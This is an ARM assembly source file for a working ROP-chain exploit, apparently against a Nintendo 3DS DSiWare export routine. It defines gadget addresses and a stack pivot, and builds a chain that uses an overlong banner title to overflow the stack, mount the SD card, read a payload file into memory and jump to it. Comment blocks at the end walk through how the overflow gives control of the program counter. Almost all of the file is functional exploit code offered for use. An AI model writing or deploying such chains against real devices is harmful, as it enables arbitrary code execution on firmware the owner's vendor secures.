	.arm
	.text

#define ENTRY 	0x0ffffe48    //-0x00681000   00681000-0ffffe48=F06811B8+0ffffe48
#define DEST	0x00682000
#define ROP 	DEST+0x4000
#define FILE 	0x00681000
#define PAYSIZE 0x00020200
#define MSET_DAT 0x00291022

#define POP_R0R2PC 0x00164654+1 //: pop {r0, r1, r2, pc}
#define POP_R0R3PC 0x0022c0e4+1 //: pop {r0, r1, r2, r3, pc}
#define POP_R0PC 0x00146760
#define POP_R1PC 0x001d53f8
#define POP_R2PC 0x00207d31
#define POP_R3PC 0x0010d44c
#define POP_R4PC 0x00120678 //: pop {r4, pc}
#define POP_R4R8PC 0x0010d20c
#define POP_R4LR_BXR2 0x00197898 //: pop {r4, lr} ; bx r2
#define ROP_POPR3_ADDSPR3_POPPC 0x0014660c + 4
#define STACK_PIVOT ROP_POPR3_ADDSPR3_POPPC
#define PIVOT_OFFSET -0x110
#define ROP_MOV_R3_R6_BLX_ADDRR5 0x001264AC
#define ROP_STR_R12R0  0x0010df64
#define ROP_STRB_R4R0 0x00243788 //: strb r4, [r0] ; pop {r4, pc}
#define ROP_MOV_R1_0 0x0019DFB4       			@; pop {r4, pc}
#define ROP_MOV_R3_4_JUNKTOR0 0x001317A4 @ LDMFD  	SP!, {R4-R8,PC}
#define ROP_MOV_R2_4_BLX_R3 0x00104bbc
#define BX_R0 0x00105d54 //: bx r0

#define svcSleepThread 0x001bdbd0
#define STR_YS 0x0028cb60
#define GARBAGE 0xADDEADE4
#define NULL 0
#define GSPGPU_SERVHANDLEADR 0x002993c4
#define GSPGPU_WriteHWRegs 0x00136200      		@sp!,{ r4 pc }
#define GSPGPU_SetLcdForceBlack 0x001c13a4  		@sp!,{ r4-r6 pc }
#define MAGENTA_ADDR 0x002A800C
#define RED 0x010000ff
#define HWREGS_ADDR 0x00202A04 

#define IFile_Read 0x001c3140 + 4
#define IFile_Write 0x001c73fc + 4
#define FS_MountSdmc 0x001a1654 + 4
#define IFile_Open 0x001c790c + 4

	.global	_start
@--------------------------------------------------------------------------------- ROP chain payload ( AM_TwlExport() )
_start:				
	@ Starts at stack address 0x0ffffe48, size 0x100. This is the DSiWare export banner title string that will crash the stack at string + 0xEC.
	@ Different languages load different string offsets in the banner, but they all get moved to the same address: 0x0ffffe48.	
	@ The exploit code that pivots to this payload is further down at "Exploit Gadgets begin"
	
	.word POP_R0PC          		@
		.word GSPGPU_SERVHANDLEADR	@ 			
	.word GSPGPU_SetLcdForceBlack  		
		.word 0xdeadbeef	@ (--) sp+=8 then pop r4,pc
		.word 0xdeadbe01	@ (r1*) - this is actually SetLcdForceBlacks arg1 (u8 r1 - black yes/no) due to it loading r1 from a stack pointer offset
		.word 0xdeadbe00	@ (r4) - r4 for the next strb instruction
	.word POP_R0PC
		.word null_addr-1
	.word ROP_STRB_R4R0
		.word GARBAGE
	.word  POP_R0PC			@ pop {r0,pc}  0x00146760
		.word STR_YS		@ (r0) (char * "YS:")
	.word FS_MountSdmc		@ FS_MOUNTSDMC(), ends with  ldmfd   sp!, {r3-r5,pc}
		.word 0xdeadbeef	@ (r3)
		.word 0xdeadbeef	@ (r4)
		.word 0xdeadbeef	@ (r5)	
	.word POP_R0R2PC		@ ldmfd sp!, {r0,r1,r2,pc}
		.word FILE		@ (r0) - _this
		.word payload_path	@ (r1) - path YS:/bb3.bin
		.word 0x00010001	@ (r2) - openflags
	.word IFile_Open		@ IFile_Open(): r0=_this r1=UTF16 path r2=openflags, ends with ldmfd sp!, {r4-r8,pc}
		.word 0xdeadbeef	@ (r4)
		.word 0xdeadbeef	@ (r5)
		.word 0xdeadbeef	@ (r6)
		.word 0xdeadbeef	@ (r7)
		.word 0xdeadbeef	@ (r8)
	.word POP_R0R3PC		@ ldmfd sp!, {r0,r1,r2,r3,pc}
		.word FILE		@ (r0) - _this
		.word FILE + 32		@ (r1) - &readbytes
		.word DEST		@ (r2) - dest
		.word PAYSIZE		@ (r3) - size
	.word IFile_Read		@ IFile_Read(_this, &readbytes, dest, size) ends with ldmfd sp!, {r4-r11,pc}
		.word 0xdeadbeef	@ (r4)
		.word 0xdeadbeef	@ (r5)
		.word 0xdeadbeef	@ (r6)
		.word 0xdeadbeef	@ (r7)
		.word 0xdeadbeef	@ (r8)
		.word 0xdeadbeef	@ (r9)
	.word POP_R3PC
		.word ROP-_start-8
	.word STACK_PIVOT
	
		
payload_path: // this is "YS:/usm.bin" wchar in ascii.  I had to do it this way to avoid a wchar null at the end
	.ascii "Y\0","S\0",":\0","/\0","u\0","s\0","m\0",".\0","b\0","i\0","n\0","\0!" 
null_addr:

@--------------------------------------------------------------------------------- Padding
	
	.fill	((_start + 0xE0 - null_addr)/4),4, GARBAGE

@--------------------------------------------------------------------------------- Exploit gadgets begin
							@ (x) x = The order of execution of the following gadgets
	.word STACK_PIVOT				@ (7) Pivots stack to ROP chain payload above
	.word ROP_MOV_R3_R6_BLX_ADDRR5			@ (4) Custom r3 (PIVOT_OFFSET) setup gadget for (7)
	.word 0x0FFFFF40				@ (2) Points to (3)
	.word 0x0FFFFEEC				@ (1) r4 ENTRYPOINT - this + 0x44 points to (2)
	.word 0x0FFFFF28				@ (5) r5 Pointer to STACK_PIVOT 
	.word PIVOT_OFFSET				@ (6) r6 (later r3) The payload location is just 0x110 behind the current SP
	.word 0x0FFFFF1C				@ (3) r7 This + 0x10 points to (4)
	.word GARBAGE					@ (-) r8 This is half-nulled by Mset so useless
	
@--------------------------------------------------------------------------------- End
@---------------------------------------------------------------------------------
@---------------------------------------------------------------------------------




@--------------------------------------------------------------------------------- Notes

/*  NOTES on the exploit gadget section
		;from the string overflow, we control r4-r7. r4 is especially important
		
		STRB		R0, [R4,#0x68] ;entrypoint - first crash was here since r4 was fuzzed - this write is further up the stack and is don't care
		LDR		R0, [R4,#0x54] '' -------------------------------------------
		MOV		R1, #2         '' *(0x0FFFFF1C + 0x4C) = 2, this is harmless
		STR		R1, [R0,#0x4C] '' -------------------------------------------
		
		B		loc_20DA10
		...						;obviously skipped what was jumped over
	loc_20DA10:                    
		
		LDR		R0, [R4,#0x44] '' -------------------------------------------
		MOV		R1, #1         '' *(0x0FFFFF40 + 0x18) = 1, also harmless
		STR		R1, [R0,#0x18] '' -------------------------------------------
		
		
		;this is where things really start
		
		LDR		R0, [R4,#0x44] ;r0 = 0x0FFFFF40
		LDR		R1, [R0]       ;r1 = 0x0FFFFF1C
		LDR		R1, [R1,#0x10] ;r1 = 0x001264AC (code!)
		BLX		R1			   ;jump to r1, got PC! - in this next custom gadget (0x001264AC), we need to get the r3 control that our stack pivot needs, AND find a way to keep PC.
							   ;continue below for details on that
*/


/*  Gadget 0x001264AC 
		;In summary,
		;MOV r12,nextgadget ; MOV r3,r6 ; b r12 --- Perfect!

		LDR		R12, [R5] //r5 contains the pointer to the stack pivot gadget address
		CMP		R12, #0
		BEQ		loc_1264CC  ;false
		MOV		R3, R6
		MOV		R2, #0      ;these 3 assignments are don't care
		MOV		R1, #0x100
		MOV		R0, #0x10000
		BLX		R12 
		
		;With PC and SP under our control, we now have a rop chain going!


*/

@ How does Link get back home after his adventures? (A Link Register)